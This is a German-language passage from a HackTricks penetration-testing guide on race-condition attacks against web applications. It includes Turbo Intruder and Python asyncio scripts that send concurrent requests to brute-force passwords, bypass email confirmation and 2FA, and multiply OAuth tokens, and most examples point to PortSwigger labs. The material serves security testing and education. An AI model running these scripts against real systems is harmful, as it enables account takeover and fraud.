# Race Condition

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

{% hint style="warning" %}
Um ein tiefes Verst√§ndnis dieser Technik zu erlangen, lesen Sie den Originalbericht unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Verbesserung von Race Condition-Angriffen

Die Hauptherausforderung bei der Ausnutzung von Race Conditions besteht darin, sicherzustellen, dass mehrere Anfragen gleichzeitig bearbeitet werden, mit **sehr geringen Unterschieden in ihren Verarbeitungszeiten - idealerweise weniger als 1 ms**.

Hier finden Sie einige Techniken zur Synchronisierung von Anfragen:

#### HTTP/2 Single-Packet-Angriff vs. HTTP/1.1 Last-Byte-Synchronisierung

- **HTTP/2**: Unterst√ºtzt das Senden von zwei Anfragen √ºber eine einzelne TCP-Verbindung, wodurch der Einfluss von Netzwerk-Jitter verringert wird. Aufgrund serverseitiger Variationen reichen jedoch zwei Anfragen m√∂glicherweise nicht aus, um eine konsistente Race-Condition-Exploit zu erzielen.
- **HTTP/1.1 'Last-Byte Sync'**: Erm√∂glicht das Vorsenden der meisten Teile von 20-30 Anfragen, wobei ein kleines Fragment zur√ºckgehalten wird, das dann zusammen gesendet wird und gleichzeitig beim Server ankommt.

**Vorbereitung f√ºr Last-Byte Sync** beinhaltet:
1. Senden von Headern und Body-Daten ohne das letzte Byte, ohne den Stream zu beenden.
2. Pause von 100 ms nach dem initialen Senden.
3. Deaktivieren von TCP_NODELAY, um den Nagle-Algorithmus zur Stapelung der letzten Frames zu nutzen.
4. Pingen zur Aufw√§rmung der Verbindung.

Das anschlie√üende Senden der zur√ºckgehaltenen Frames sollte zu deren Ankunft in einem einzelnen Paket f√ºhren, das mit Wireshark √ºberpr√ºft werden kann. Diese Methode gilt nicht f√ºr statische Dateien, die normalerweise nicht in RC-Angriffen verwendet werden.

### Anpassung an die Serverarchitektur

Das Verst√§ndnis der Architektur des Ziels ist entscheidend. Front-End-Server k√∂nnen Anfragen unterschiedlich routen, was sich auf die Timing auswirkt. Eine vorbeugende serverseitige Verbindungsaufw√§rmung durch bedeutungslose Anfragen kann die Anfragetiming normalisieren.

#### Umgang mit Sitzungsbasierter Sperrung

Frameworks wie der PHP-Sitzungs-Handler serialisieren Anfragen nach Sitzung, was potenziell Sicherheitsl√ºcken verschleiern kann. Die Verwendung unterschiedlicher Sitzungstoken f√ºr jede Anfrage kann dieses Problem umgehen.

#### √úberwindung von Raten- oder Ressourcenbeschr√§nkungen

Wenn die Verbindungsaufw√§rmung nicht wirksam ist, kann das absichtliche Ausl√∂sen von Verz√∂gerungen der Raten- oder Ressourcenbeschr√§nkungen der Webserver durch eine Flut von Dummy-Anfragen den Single-Packet-Angriff erleichtern, indem eine serverseitige Verz√∂gerung induziert wird, die f√ºr Race Conditions f√∂rderlich ist.


## Angriffsbeispiele

* **Tubo Intruder - HTTP2 Single-Packet-Angriff (1 Endpunkt)**: Sie k√∂nnen die Anfrage an **Turbo Intruder** senden (`Erweiterungen` -> `Turbo Intruder` -> `An Turbo Intruder senden`), Sie k√∂nnen in der Anfrage den Wert, den Sie f√ºr **`%s`** brute forcen m√∂chten, wie in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, √§ndern und dann das **`examples/race-single-packer-attack.py`** ausw√§hlen:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie **verschiedene Werte senden** m√∂chten, k√∂nnen Sie den Code mit dem folgenden √§ndern, der eine Wordlist aus der Zwischenablage verwendet:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Wenn die Webseite kein HTTP2 unterst√ºtzt (nur HTTP1.1), verwenden Sie stattdessen `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 Einzelpaket-Angriff (mehrere Endpunkte)**: Wenn Sie eine Anfrage an einen Endpunkt senden m√ºssen und dann mehrere Anfragen an andere Endpunkte, um die RCE auszul√∂sen, k√∂nnen Sie das Skript `race-single-packet-attack.py` wie folgt √§ndern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Es ist auch in **Repeater** √ºber die neue Option '**Gruppe parallel senden**' in Burp Suite verf√ºgbar.
* F√ºr **limit-overrun** k√∂nnten Sie einfach die **gleiche Anfrage 50 Mal** in der Gruppe hinzuf√ºgen.
* F√ºr **Verbindungsw√§rmung** k√∂nnten Sie am **Anfang** der **Gruppe** einige Anfragen an einen nicht statischen Teil des Webservers hinzuf√ºgen.
* Um den Prozess **zwischen** der Verarbeitung **einer Anfrage und einer anderen** in zwei Unterzustandsschritten zu **verz√∂gern**, k√∂nnten Sie zus√§tzliche Anfragen zwischen beiden Anfragen hinzuf√ºgen.
* F√ºr einen **Multi-Endpoint** RC k√∂nnten Sie die **Anfrage**, die zum versteckten Zustand f√ºhrt, senden und dann **50 Anfragen** direkt danach senden, die den versteckten Zustand ausnutzen.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Raw BF

Vor der vorherigen Forschung wurden einige Payloads verwendet, die versuchten, die Pakete so schnell wie m√∂glich zu senden, um einen RC zu verursachen.

* **Repeater:** √úberpr√ºfen Sie die Beispiele aus dem vorherigen Abschnitt.
* **Intruder**: Senden Sie die **Anfrage** an **Intruder**, setzen Sie die **Anzahl der Threads** im **Optionsmen√º auf 30** und w√§hlen Sie als Payload **Null-Payloads** und generieren Sie **30**.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodik**

### Limit-√úberlauf / TOCTOU

Dies ist die grundlegendste Art von Rennbedingung, bei der **Schwachstellen** auftreten, die an Orten auftreten, an denen die Anzahl der m√∂glichen Aktionen begrenzt ist. Zum Beispiel die mehrfache Verwendung desselben Rabattcodes in einem Webshop. Ein sehr einfaches Beispiel findet sich in [**diesem Bericht**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**diesem Fehler**](https://hackerone.com/reports/759247)**.**

Es gibt viele Variationen dieser Art von Angriff, darunter:

* Mehrfaches Einl√∂sen einer Geschenkkarte
* Mehrfaches Bewerten eines Produkts
* Abheben oder √úbertragen von Bargeld √ºber den Kontostand hinaus
* Wiederverwendung einer einzelnen CAPTCHA-L√∂sung
* Umgehen einer Anti-Brute-Force-Ratebegrenzung

### **Versteckte Unterzust√§nde**

Die Ausnutzung komplexer Rennbedingungen beinhaltet oft die Nutzung kurzzeitiger Gelegenheiten zur Interaktion mit versteckten oder **unerw√ºnschten Maschinenunterzust√§nden**. So gehen Sie vor:

1. **Potenzielle versteckte Unterzust√§nde identifizieren**
- Beginnen Sie damit, Endpunkte zu ermitteln, die kritische Daten wie Benutzerprofile oder Passwortr√ºcksetzungsprozesse √§ndern oder mit ihnen interagieren. Konzentrieren Sie sich auf:
- **Speicherung**: Bevorzugen Sie Endpunkte, die serverseitige persistente Daten manipulieren, gegen√ºber solchen, die Daten clientseitig verarbeiten.
- **Aktion**: Suchen Sie nach Operationen, die vorhandene Daten √§ndern, da diese eher zu ausnutzbaren Bedingungen f√ºhren als solche, die neue Daten hinzuf√ºgen.
- **Schl√ºsselung**: Erfolgreiche Angriffe beinhalten in der Regel Operationen, die auf demselben Identifikator basieren, z. B. Benutzername oder R√ºcksetzungstoken.

2. **Erste Sondierung durchf√ºhren**
- Testen Sie die identifizierten Endpunkte mit Rennbedingungsangriffen und beobachten Sie Abweichungen von den erwarteten Ergebnissen. Unerwartete Antworten oder √Ñnderungen im Anwendungsverhalten k√∂nnen auf eine Schwachstelle hinweisen.

3. **Die Schwachstelle demonstrieren**
- Reduzieren Sie den Angriff auf die minimale Anzahl von Anfragen, die erforderlich sind, um die Schwachstelle auszunutzen, oft nur zwei. Dieser Schritt erfordert m√∂glicherweise mehrere Versuche oder Automatisierung aufgrund des pr√§zisen Timings.

### Zeitabh√§ngige Angriffe

Pr√§zises Timing von Anfragen kann Schwachstellen aufdecken, insbesondere wenn vorhersehbare Methoden wie Zeitstempel f√ºr Sicherheitstoken verwendet werden. Zum Beispiel k√∂nnten durch die Generierung von Passwortr√ºcksetztokens basierend auf Zeitstempeln identische Tokens f√ºr gleichzeitige Anfragen erm√∂glicht werden.

**Zum Ausnutzen:**
- Verwenden Sie pr√§zises Timing, wie einen einzelnen Paketangriff, um gleichzeitige Passwortr√ºcksetzanfragen zu stellen. √úbereinstimmende Tokens deuten auf eine Schwachstelle hin.

**Beispiel:**
- Fordern Sie gleichzeitig zwei Passwortr√ºcksetztokens an und vergleichen Sie sie. √úbereinstimmende Tokens deuten auf einen Fehler in der Token-Generierung hin.

**√úberpr√ºfen Sie dieses [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities), um dies auszuprobieren.**


## Fallstudien zu versteckten Unterzust√§nden

### Bezahlen und einen Artikel hinzuf√ºgen

√úberpr√ºfen Sie dieses [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), um zu sehen, wie Sie in einem Gesch√§ft **bezahlen** und einen zus√§tzlichen Artikel hinzuf√ºgen k√∂nnen, f√ºr den Sie nicht bezahlen m√ºssen.

### Andere E-Mails best√§tigen

Die Idee besteht darin, **eine E-Mail-Adresse zu √ºberpr√ºfen und gleichzeitig in eine andere zu √§ndern**, um herauszufinden, ob die Plattform die neue Adresse √ºberpr√ºft.

### √Ñndern der E-Mail-Adresse in 2 E-Mail-Adressen basierend auf Cookies

Laut [**dieser Untersuchung**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab anf√§llig f√ºr eine √úbernahme auf diese Weise, da es m√∂glicherweise das **E-Mail-Verifizierungstoken einer E-Mail an die andere E-Mail sendet**.

**√úberpr√ºfen Sie dieses [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint), um dies auszuprobieren.**

### Versteckte Datenbankzust√§nde / Best√§tigungsumgehung

Wenn **2 verschiedene Schreibvorg√§nge** verwendet werden, um **Informationen** in einer **Datenbank hinzuzuf√ºgen**, gibt es einen kleinen Zeitraum, in dem nur die erste Daten in die Datenbank geschrieben wurden. Zum Beispiel werden bei der Erstellung eines Benutzers der **Benutzername** und das **Passwort** m√∂glicherweise **geschrieben** und dann das Token zur Best√§tigung des neu erstellten Kontos geschrieben. Dies bedeutet, dass das **Token zur Best√§tigung eines Kontos f√ºr kurze Zeit null ist**.

Daher k√∂nnte das **Registrieren eines Kontos und das Senden mehrerer Anfragen mit einem leeren Token** (`token=` oder `token[]=` oder einer anderen Variation) erm√∂glichen, ein Konto zu **best√§tigen**, bei dem Sie die E-Mail nicht kontrollieren.

**√úberpr√ºfen Sie dieses [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction), um dies auszuprobieren.**

### 2FA umgehen

Der folgende Pseudocode ist anf√§llig f√ºr eine Rennbedingung, da in einer sehr kurzen Zeit die **2FA nicht durchgesetzt wird**, w√§hrend die Sitzung erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewige Persistenz

Es gibt mehrere [**OAuth-Anbieter**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Diese Dienste erm√∂glichen es Ihnen, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die der Anbieter registriert hat. Um dies zu tun, muss der **Client** Ihrer Anwendung erlauben, auf einige ihrer Daten innerhalb des **OAuth-Anbieters** zuzugreifen.\
Bis hierhin handelt es sich nur um eine gew√∂hnliche Anmeldung mit Google/LinkedIn/GitHub... bei der Sie aufgefordert werden, eine Seite anzuzeigen, auf der steht: "_Application \<InsertCoolName> m√∂chte auf Ihre Informationen zugreifen. M√∂chten Sie dies zulassen?_"

#### Race Condition in `authorization_code`

Das **Problem** tritt auf, wenn Sie dies **akzeptieren** und automatisch einen **`authorization_code`** an die b√∂sartige Anwendung senden. Diese Anwendung missbraucht dann eine Race Condition im OAuth-Dienstanbieter, um mehr als einen AT/RT (_Authentication Token/Refresh Token_) aus dem **`authorization_code`** f√ºr Ihr Konto zu generieren. Im Wesentlichen missbraucht sie die Tatsache, dass Sie der Anwendung erlaubt haben, auf Ihre Daten zuzugreifen, um **mehrere Konten zu erstellen**. Wenn Sie dann die Anwendung nicht mehr erlauben, auf Ihre Daten zuzugreifen, wird ein Paar AT/RT gel√∂scht, aber die anderen bleiben g√ºltig.

#### Race Condition in `Refresh Token`

Sobald Sie einen g√ºltigen RT erhalten haben, k√∂nnen Sie versuchen, ihn zu missbrauchen, um mehrere AT/RT zu generieren, und selbst wenn der Benutzer die Berechtigungen f√ºr die b√∂sartige Anwendung zum Zugriff auf seine Daten widerruft, bleiben mehrere RTs g√ºltig.

## **RC in WebSockets**

In [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) finden Sie ein PoC in Java, um WebSocket-Nachrichten **parallel** zu senden und so auch **Race Conditions in WebSockets** auszunutzen.

## Referenzen

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repos senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Jetzt zugreifen:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
